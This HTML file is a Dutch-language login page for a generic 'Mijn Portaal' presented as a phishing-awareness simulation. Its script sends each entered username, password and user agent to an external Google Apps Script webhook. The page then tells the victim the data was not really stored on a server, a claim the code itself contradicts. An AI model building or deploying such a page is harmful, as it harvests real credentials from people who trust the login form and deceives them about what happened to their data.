<!DOCTYPE html>
<html lang="nl">
<head>
  <meta charset="UTF-8">
  <title>Login Mijn Portaal</title>
  <style>
    body {
      background-color: #111;
      color: #0f0;
      font-family: monospace;
      text-align: center;
      margin-top: 100px;
    }
    input, button {
      padding: 10px;
      margin: 10px;
      background: #222;
      color: #0f0;
      border: none;
    }
    #result {
      display: none;
      margin-top: 30px;
      color: red;
    }
  </style>
</head>
<body>
  <h2>Login bij Mijn Portaal</h2>
  <form id="loginForm">
    <input type="text" id="username" placeholder="Gebruikersnaam" required><br>
    <input type="password" id="password" placeholder="Wachtwoord" required><br>
    <button type="submit">Inloggen</button>
  </form>

  <div id="result">
    <h3>⚠️ Phishing Simulatie ⚠️</h3>
    <p>Je gegevens zijn niet echt opgeslagen op een server.<br>
    Dit was een test om je bewust te maken van online phishing.<br>
    Denk twee keer na voor je ergens je wachtwoord ingeeft.</p>
  </div>

  <script>
    const webhookURL = "https://script.google.com/macros/s/AKfycbzHHDjulEcUAHwGyj2b87IdQttDnK_nbW-a8sdgRuGOcgAHvYm09RPDkQyPghcDA91D/exec";

    document.getElementById("loginForm").addEventListener("submit", function(e) {
      e.preventDefault();

      const username = document.getElementById("username").value;
      const password = document.getElementById("password").value;
      const userAgent = navigator.userAgent;

      fetch(webhookURL, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          username: username,
          password: password,
          userAgent: userAgent
        })
      });

      document.getElementById("loginForm").style.display = "none";
      document.getElementById("result").style.display = "block";
    });
  </script>
</body>
</html>
